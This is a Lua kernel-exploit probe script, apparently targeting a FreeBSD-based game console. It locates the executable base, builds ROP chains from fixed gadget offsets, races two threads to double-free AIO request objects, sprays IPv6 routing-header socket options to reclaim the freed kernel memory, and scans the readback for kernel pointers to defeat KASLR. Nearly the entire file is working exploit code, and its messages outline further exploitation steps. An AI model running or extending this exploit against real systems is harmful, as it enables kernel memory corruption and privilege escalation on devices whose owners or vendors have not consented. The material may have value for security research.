-- CRASH_CLASS: HIGH
-- PROBE 77b: prolapse race + RTHDR spray reclaim + overlap detection
--
-- Based on zecoxao's prolapse code and our confirmed 65l double-delete.
-- Strategy:
--   1. Submit BATCH AIO requests (individually, as in 65l)
--   2. Two child threads both call 662 to delete → double-free
--   3. Main thread immediately sprays RTHDR setsockopt at multiple sizes
--      to reclaim the double-freed UMA chunk
--   4. getsockopt readback on all spray sockets — if socket[i] reads
--      socket[j]'s tag, the double-freed chunk was reclaimed by two
--      sockets → confirmed cross-zone overlap
--   5. Try sizes 56 (64B zone), 88 (128B zone), 120 (128B zone)
--      to find which zone m_aio_reqs2 actually lands in

print("=== PROBE 77b: PROLAPSE RACE + RTHDR SPRAY RECLAIM ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wb(a, v) pcall(function() memory.write_byte(a, v) end) end
local function rb(a)
    local ok, v = pcall(function() return N(memory.read_byte(a)) end)
    if ok then return v end return 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSYS(12)
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- /dev/zero for AIO reads
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

-- AIO init
pcall(function() mk(670)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)

local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

-- RTHDR spray helpers
local sc_socket = mk(97)
local sc_setsockopt = mk(105)
local sc_getsockopt = mk(118)
local sc_close = mk(6)

local spray_buf = memory.alloc(256)
local read_buf = memory.alloc(256)
local read_len = memory.alloc(8)

local function build_rthdr(size, tag)
    for i = 0, size - 1 do wb(N(spray_buf) + i, 0) end
    wb(N(spray_buf), 0)
    wb(N(spray_buf) + 1, (size / 8) - 1)
    wb(N(spray_buf) + 2, 0)
    wb(N(spray_buf) + 3, (size - 8) / 16)
    wd(N(spray_buf) + 8, tag)
end

local function call(sc, ...)
    local ok, v = pcall(sc, ...)
    if not ok then return -999 end
    return N(v)
end

-- Shared buffers for children
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)

-- ============================================================
-- TEST SIZES: try to find which zone m_aio_reqs2 lands in
-- The gist says 0x58 -> 0x80 (128B) bucket
-- We test 56B (64B zone) and 88/120B (128B zone)
-- ============================================================
local TEST_SIZES = {88, 120, 56}   -- 128B zone first (most likely per gist)
local SPRAY_PER_SIZE = 40          -- sockets per size per round

print("")
print("[A] RACE + SPRAY — 10 rounds, " .. BATCH .. " IDs, " ..
    #TEST_SIZES .. " spray sizes × " .. SPRAY_PER_SIZE)

local ITERS = 10
local total_overlaps = 0
local total_doubles = 0
local total_kptrs = 0

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: DEAD", iter))
        break
    end

    -- Submit BATCH AIO requests
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then
            poll_one(id)
            ids[#ids + 1] = id
        end
    end
    if #ids < 4 then
        print(string.format("  iter %d: only %d IDs, skip", iter, #ids))
        break
    end
    local count = #ids

    -- Write shared ID array
    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))

    -- Build child A: marker + 662
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A); local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    emA(g_pop_rax); emA(uint64(0x41414141))
    emA(g_pop_rdi); emA(uint64(N(marker_A)))
    emA(g_mov_m_rax)
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431))
    emA(stub)

    -- Build child B: marker + 662
    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B); local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g_pop_rax); emB(uint64(0x42424242))
    emB(g_pop_rdi); emB(uint64(N(marker_B)))
    emB(g_mov_m_rax)
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(count))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662))
    emB(stub)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431))
    emB(stub)

    -- thr_param A
    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A))
    wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0))
    wq(N(par_A) + 0x30, tA)

    -- thr_param B
    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B))
    wq(N(par_B) + 0x18, uint64(0x2000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0))
    wq(N(par_B) + 0x30, tB)

    -- Spawn both children
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    -- Wait for children to finish (busy spin)
    for w = 1, 50000 do local _ = rd(sb_A) end

    -- Check double-delete
    local a_ok = 0; local b_ok = 0; local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 then a_ok = a_ok + 1 end
        if sB == 0 then b_ok = b_ok + 1 end
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles

    if doubles == 0 then
        if iter <= 3 or iter == ITERS then
            print(string.format("  iter %d: no double (A=%d B=%d)", iter, a_ok, b_ok))
        end
    else
        print(string.format("  iter %d: *** %d DOUBLE DELETES *** A=%d B=%d",
            iter, doubles, a_ok, b_ok))

        -- SPRAY RECLAIM: for each test size, spray tagged RTHDR sockets
        -- and readback to detect if two sockets share a chunk
        for _, sz in ipairs(TEST_SIZES) do
            local spray_fds = {}
            local spray_ok = 0
            for s = 1, SPRAY_PER_SIZE do
                local fd = call(sc_socket, uint64(28), uint64(2), uint64(0))
                spray_fds[s] = fd
                if fd >= 0 then
                    build_rthdr(sz, 0x77000000 + iter * 0x1000 + s)
                    local rv = call(sc_setsockopt, uint64(fd), uint64(41), uint64(51),
                        spray_buf, uint64(sz))
                    if rv == 0 then spray_ok = spray_ok + 1 end
                end
            end

            -- Readback and check for overlap
            local overlaps = 0
            local own_ok = 0
            for s = 1, SPRAY_PER_SIZE do
                if spray_fds[s] and spray_fds[s] >= 0 then
                    wd(N(read_len), 256)
                    local rv = call(sc_getsockopt, uint64(spray_fds[s]), uint64(41),
                        uint64(51), read_buf, read_len)
                    if rv == 0 then
                        local tag = rd(N(read_buf) + 8) or 0
                        local expected = 0x77000000 + iter * 0x1000 + s
                        if tag == expected then
                            own_ok = own_ok + 1
                        elseif (tag >= 0x77000000) and (tag ~= expected) then
                            overlaps = overlaps + 1
                            local other_s = tag - 0x77000000 - iter * 0x1000
                            print(string.format("    *** OVERLAP sz=%d: fd[%d] reads fd[%d]'s tag 0x%08X ***",
                                sz, s, other_s, tag))
                        end

                        -- Also scan for kernel pointers in the readback
                        for off = 0, sz - 8, 8 do
                            local v = rq(N(read_buf) + off)
                            if v then
                                local h, l = get_hi_lo(v)
                                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                                    total_kptrs = total_kptrs + 1
                                    print(string.format("    *** KPTR sz=%d fd[%d]+0x%X: %s ***",
                                        sz, s, off, fmt(v)))
                                end
                            end
                        end
                    end
                end
            end

            total_overlaps = total_overlaps + overlaps
            if overlaps > 0 then
                print(string.format("    zone %dB (optlen=%d): %d OVERLAPS / %d sprayed",
                    sz <= 64 and 64 or sz <= 128 and 128 or 256, sz, overlaps, spray_ok))
            end

            -- Cleanup spray sockets
            for s = 1, SPRAY_PER_SIZE do
                if spray_fds[s] and spray_fds[s] >= 0 then
                    call(sc_close, uint64(spray_fds[s]))
                end
            end
        end
    end
end

-- Summary
print("")
print("[B] SUMMARY")
print(string.format("  race iters:    %d", ITERS))
print(string.format("  double frees:  %d", total_doubles))
print(string.format("  OVERLAPS:      %d", total_overlaps))
print(string.format("  kernel ptrs:   %d", total_kptrs))
print(string.format("  process:       %s", alive() and "ALIVE" or "DEAD"))

if total_overlaps > 0 then
    print("")
    print("*** CROSS-ZONE RECLAIM CONFIRMED ***")
    print("RTHDR spray reclaimed double-freed AIO chunk.")
    print("Two sockets share one UMA slot → controllable overlap.")
    print("Next: read kernel pointers from the stale AIO object through getsockopt.")
end

if total_kptrs > 0 then
    print("")
    print("*** KERNEL POINTER LEAKED VIA SPRAY READBACK ***")
    print("KASLR defeated through AIO double-free + RTHDR reclaim.")
end

if total_doubles > 0 and total_overlaps == 0 then
    print("")
    print("Double-free hits but no spray overlap detected.")
    print("Possible causes:")
    print("  - AIO object is in a different UMA zone than RTHDR")
    print("  - Need more spray volume or different sizes")
    print("  - Spray timing: need spray DURING the race, not after")
end

print("")
print("=== 77b COMPLETE ===")
